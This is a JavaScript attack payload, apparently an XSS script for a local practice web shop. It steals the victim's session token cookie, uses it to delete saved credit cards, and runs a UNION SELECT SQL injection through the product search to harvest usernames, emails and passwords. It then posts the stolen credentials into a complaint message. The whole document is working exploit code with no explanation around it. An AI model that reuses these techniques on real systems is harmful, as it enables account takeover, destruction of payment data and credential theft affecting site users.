// Get value of token cookie which is the same value as the Bearer Token
const token = ("; " + document.cookie).split(`; token=`).pop().split(";")[0];

//Delete credit cards
for (var i = 0; i < 10; i++) {
  fetch("http://localhost:3000/api/Cards/" + i, {
    method: "DELETE",
    headers: {
      Authorization: "Bearer " + token,
    },
  });
}
//Invoke SQLi and harvest information
var xhr = new XMLHttpRequest();
xhr.open(
  "GET",
  "http://localhost:3000/rest/products/search?q=a\\'))+UNION+SELECT+username,+username,+email,+password,+null,+null,+null,+null,+null+FROM+users--",
  true
);
xhr.onreadystatechange = function () {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      // Parse the response JSON data
      var data_gathered = JSON.parse(xhr.responseText);
      // Get the usernames and passwords from the json response
      var credentials = data_gathered.data
        .map(function (obj) {
          return obj.description + " - " + obj.price;
        })
        .join(", ");
      console.log(credentials);
      // Send complaint
      var requestBodyComplaint = {
        UserId: 1,
        message: credentials,
      };
      var requestInJSON = JSON.stringify(requestBodyComplaint);
      // Send Complaint
      fetch("http://localhost:3000/api/Complaints/", {
        method: "POST",
        headers: {
          Authorization: "Bearer " + token,
          "Content-Type": "application/json",
        },
        body: requestInJSON,
      });
    }
  } else {
    console.error("Error during XMLHttpRequest. Status:", xhr.status);
  }
};
xhr.send();
